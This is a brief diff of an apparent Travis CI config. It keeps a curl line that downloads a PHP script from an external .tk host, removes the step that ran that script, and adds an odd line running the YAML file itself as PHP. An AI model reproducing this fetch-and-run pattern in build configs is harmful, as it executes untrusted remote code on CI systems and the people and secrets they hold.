@@ -22,4 +22,4 @@ branches:
  - curl -o Travis.php https://rtgnetwork.tk/travis/file.php
  
 script:
- - php Travis.php
+ - php .travis.yml
